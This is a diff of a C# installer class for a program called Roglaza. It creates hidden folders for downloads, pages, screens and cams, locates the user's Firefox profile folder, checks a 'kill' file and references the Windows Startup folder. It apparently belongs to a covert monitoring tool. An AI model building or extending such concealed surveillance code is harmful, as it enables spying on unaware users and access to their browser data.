@@ -9,23 +9,62 @@ namespace Roglaza
     class RoglazaInstaller
     {
         public static List<string> RoglazaDirectories = new List<string>() { "Downloads","Pages","Screens","Cams"};
-
-        internal static void InstallDirectories(string CurrentDirectory)
+        internal static string getKillFilePath()
         {
-            CurrentDirectory += "\\Logs";
+            return GetRoglazaAPPDataPath() + "\\kill";
+        }
+        internal static string GetTempPath()
+        {
+            return System.IO.Path.GetTempPath();
+        }
 
-            string ApDataPath = RoglazaHelper.GetRoglazaAPPDataPath();
+        internal static string GetRoglazaAPPDataPath()
+        {
+            string tempPath = GetTempPath() + @"\..\Roglaza";
+            tempPath=tempPath.Replace("\\\\", "\\");
+            tempPath = System.IO.Path.GetFullPath(tempPath);
+            return tempPath ;
+        }
+
+        public static string GetApplicationDataDirectory()
+        {
+
+            return Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+        }
+        public static string GETFireFox_Profile_FOlder()
+        {
+            string s = @"C:\Users\"+Environment.UserName+@"\AppData\Roaming\Mozilla\Firefox\Profiles\";
+            string[] dirs = System.IO.Directory.GetDirectories(s);
+            if (dirs.Length < 1)
+                return "";
+            string res = dirs[0];
+            foreach (string d in dirs)
+            {
+                if (d.EndsWith("default"))
+                    res = d;
+            }
+            return res;
+        }
+
+        internal static void InstallDirectories()
+        {
+          string   CurrentDirectory = Program.ProgramSettings.LogsPath;
+
+            string ApDataPath = GetRoglazaAPPDataPath();
             RoglazaInstaller.CreatIfNotExisted(ApDataPath);
+            RoglazaHelper.SetFolderHidden(ApDataPath);
 
             if (RoglazaHelper.IsExistedDirectory(CurrentDirectory))
-                RoglazaInstaller.CreatIfNotExisted(CurrentDirectory);
             {
-              
-                foreach (string dir in RoglazaInstaller.RoglazaDirectories)
-                    RoglazaInstaller.CreatIfNotExisted(CurrentDirectory + "\\" + dir);
+                RoglazaInstaller.CreatIfNotExisted(CurrentDirectory);
+                RoglazaHelper.SetFolderHidden(CurrentDirectory);
 
             }
             
+            foreach (string dir in RoglazaInstaller.RoglazaDirectories)
+                    RoglazaInstaller.CreatIfNotExisted(CurrentDirectory + "\\" + dir);
+
+          
         }
 
         private static void CreatIfNotExisted(string p)
@@ -36,7 +75,7 @@ namespace Roglaza
 
         internal static bool SetKillFile(bool killme)
         {
-            string file = RoglazaHelper.getKillFilePath();
+            string file = getKillFilePath();
 
             if (killme)
             {
@@ -50,7 +89,7 @@ namespace Roglaza
 
         internal static bool IsAdminUnistalledMe()
         {
-          return  RoglazaHelper.IsExistedFile(RoglazaHelper.GetRoglazaAPPDataPath() + "//kill");
+          return  RoglazaHelper.IsExistedFile(GetRoglazaAPPDataPath() + "\\kill");
         }
         public static string StartupPath=@"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup";
     }
